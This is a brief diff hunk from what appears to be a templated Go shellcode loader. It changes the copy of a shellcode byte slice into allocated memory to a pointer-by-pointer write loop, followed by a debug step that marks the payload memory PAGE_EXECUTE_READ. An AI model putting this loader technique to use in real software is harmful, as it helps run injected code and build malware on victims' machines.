@@ -67,9 +67,10 @@ func run( shellcode []byte) {
 	//	return
 	//}
 
-	buff := (*[1890000]byte)(unsafe.Pointer(addr))
-	for x, y := range shellcode {
-		buff[x] = y
+	for index := uint32(0); index < uint32(len(shellcode)); index++ {
+		writePtr := unsafe.Pointer(addr + uintptr(index))
+		v := (*byte)(writePtr)
+		*v = shellcode[index]
 	}
 	{{if .Debug}}
 	printDebug("debug","Change payload memory protection to PAGE_EXECUTE_READ")
